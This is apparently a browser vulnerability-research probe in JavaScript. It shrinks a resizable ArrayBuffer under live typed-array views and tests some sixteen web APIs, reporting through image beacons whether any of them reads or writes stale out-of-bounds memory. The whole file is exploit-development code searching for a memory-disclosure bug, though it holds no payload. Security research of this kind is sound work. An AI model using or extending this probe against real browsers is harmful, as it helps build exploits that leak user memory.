// p160b — RAB stale-read shotgun: test EVERY DOM sink
// p160a showed TextDecoder and SubtleCrypto both throw "Type error"
// This probe tests many more paths to find one that reads stale data
// Beacon prefix: V160B-

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V160B-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  // Verify RAB
  try {
    var t = new ArrayBuffer(16, { maxByteLength: 64 });
    if (!t.resizable) { B('NO-RAB'); return; }
  } catch(e) { B('NO-RAB-' + e.message.substring(0,20)); return; }
  B('RAB-OK');

  var INIT = 8192;
  var MAX = 65536;

  // T0: Sanity — TextDecoder on NORMAL (non-resized) view
  try {
    var sanBuf = new ArrayBuffer(INIT, { maxByteLength: MAX });
    var sanView = new Uint8Array(sanBuf, 0, INIT);
    for (var i = 0; i < INIT; i++) sanView[i] = 0x41;
    var sanDec = new TextDecoder();
    var sanText = sanDec.decode(sanView);
    B('T0-SANITY-' + sanText.length);
  } catch(e) {
    B('T0-ERR-' + e.message.substring(0,30));
  }

  // Create the OOB view
  var rab = new ArrayBuffer(INIT, { maxByteLength: MAX });
  var exView = new Uint8Array(rab, 0, INIT); // explicit length
  for (var i = 0; i < INIT; i++) exView[i] = 0xAB;
  exView[0] = 0xDE; exView[1] = 0xAD;

  // Also create auto-length view BEFORE resize
  var autoView = new Uint8Array(rab);
  B('AUTOVIEW-PRE-' + autoView.byteLength);

  // Resize down
  rab.resize(1);
  B('RESIZED-' + rab.byteLength);
  B('EXVIEW-JSLEN-' + exView.byteLength);
  B('AUTOVIEW-JSLEN-' + autoView.byteLength);

  // T1: TextDecoder on explicit-length OOB view
  try {
    var d = new TextDecoder('utf-8', {fatal: false});
    var t1 = d.decode(exView);
    B('T1-TD-EX-' + t1.length);
  } catch(e) { B('T1-TD-EX-ERR-' + e.message.substring(0,25)); }

  // T2: TextDecoder on auto-length view
  try {
    var d2 = new TextDecoder('utf-8', {fatal: false});
    var t2 = d2.decode(autoView);
    B('T2-TD-AUTO-' + t2.length);
  } catch(e) { B('T2-TD-AUTO-ERR-' + e.message.substring(0,25)); }

  // T3: TextDecoder on the RAB directly (as ArrayBuffer)
  try {
    var d3 = new TextDecoder();
    var t3 = d3.decode(rab);
    B('T3-TD-RAB-' + t3.length);
  } catch(e) { B('T3-TD-RAB-ERR-' + e.message.substring(0,25)); }

  // T4: Blob constructor
  try {
    var blob = new Blob([exView]);
    B('T4-BLOB-' + blob.size);
  } catch(e) { B('T4-BLOB-ERR-' + e.message.substring(0,25)); }

  // T5: Blob with auto-length view
  try {
    var blob2 = new Blob([autoView]);
    B('T5-BLOBAUTO-' + blob2.size);
  } catch(e) { B('T5-BLOBAUTO-ERR-' + e.message.substring(0,25)); }

  // T6: Response constructor + text()
  try {
    var resp = new Response(exView);
    resp.text().then(function(t) {
      B('T6-RESP-' + t.length);
    }).catch(function(e) {
      B('T6-RESP-ERR-' + e.message.substring(0,25));
    });
  } catch(e) { B('T6-RESP-CERR-' + e.message.substring(0,25)); }

  // T7: structuredClone
  try {
    var cloned = structuredClone(exView);
    B('T7-CLONE-' + cloned.byteLength);
  } catch(e) { B('T7-CLONE-ERR-' + e.message.substring(0,25)); }

  // T8: structuredClone auto-length view
  try {
    var cloned2 = structuredClone(autoView);
    B('T8-CLONEAUTO-' + cloned2.byteLength);
  } catch(e) { B('T8-CLONEAUTO-ERR-' + e.message.substring(0,25)); }

  // T9: crypto.getRandomValues on OOB view (WRITE test!)
  try {
    crypto.getRandomValues(exView);
    B('T9-RNG-OK');
    var sum = 0;
    for (var i = 0; i < 10; i++) sum += exView[i];
    B('T9-RNG-SUM10-' + sum);
  } catch(e) { B('T9-RNG-ERR-' + e.message.substring(0,25)); }

  // T10: XMLHttpRequest.send(view)
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/beacon/V160B-T10-XHR', false);
    xhr.send(exView);
    B('T10-XHR-OK');
  } catch(e) { B('T10-XHR-ERR-' + e.message.substring(0,25)); }

  // T11: DataView on the RAB
  try {
    var dv = new DataView(rab, 0, INIT);
    B('T11-DV-JSLEN-' + dv.byteLength);
    rab.resize(1);
    B('T11-DV-POSTLEN-' + dv.byteLength);
  } catch(e) { B('T11-DV-ERR-' + e.message.substring(0,25)); }

  // T12: view.slice()
  try {
    var sliced = exView.slice();
    B('T12-SLICE-' + sliced.byteLength);
  } catch(e) { B('T12-SLICE-ERR-' + e.message.substring(0,25)); }

  // T13: Array.from(view)
  try {
    var arr = Array.from(exView);
    B('T13-ARRFROM-' + arr.length);
  } catch(e) { B('T13-ARRFROM-ERR-' + e.message.substring(0,25)); }

  // T14: TextEncoder on string, then check TextDecoder on good view
  // Just confirming TextDecoder works at all on this page
  try {
    var enc = new TextEncoder();
    var encoded = enc.encode('hello');
    var dec14 = new TextDecoder();
    var decoded = dec14.decode(encoded);
    B('T14-ENCDEC-' + decoded);
  } catch(e) { B('T14-ENCDEC-ERR-' + e.message.substring(0,25)); }

  // T15: Create NEW view on resized RAB with stale offset
  // rab is at byteLength=1. Create view at offset 0, but try to read from C++ path
  try {
    rab.resize(INIT); // resize back to original
    var v15 = new Uint8Array(rab, 0, INIT);
    for (var i = 0; i < INIT; i++) v15[i] = 0xCC;
    rab.resize(1); // shrink again
    B('T15-JSLEN-' + v15.byteLength);

    // Try Blob
    var b15 = new Blob([v15]);
    B('T15-BLOB-' + b15.size);

    // Try FileReader
    var fr = new FileReader();
    fr.onload = function() {
      var result = new Uint8Array(fr.result);
      B('T15-FR-' + result.byteLength);
      if (result.byteLength > 100) {
        B('T15-FR-STALE-' + result[0].toString(16) + result[1].toString(16));
      }
    };
    fr.onerror = function() { B('T15-FR-ERR'); };
    fr.readAsArrayBuffer(b15);
  } catch(e) { B('T15-ERR-' + e.message.substring(0,25)); }

  // T16: MessageChannel transfer
  try {
    var mc = new MessageChannel();
    mc.port1.onmessage = function(ev) {
      var d = ev.data;
      B('T16-MSG-' + (d ? d.byteLength || d.length || 'noLen' : 'null'));
    };
    mc.port2.postMessage(exView);
    B('T16-POST-OK');
  } catch(e) { B('T16-MSG-ERR-' + e.message.substring(0,25)); }

  // Give async operations time
  setTimeout(function() { B('DONE'); }, 2000);
})();
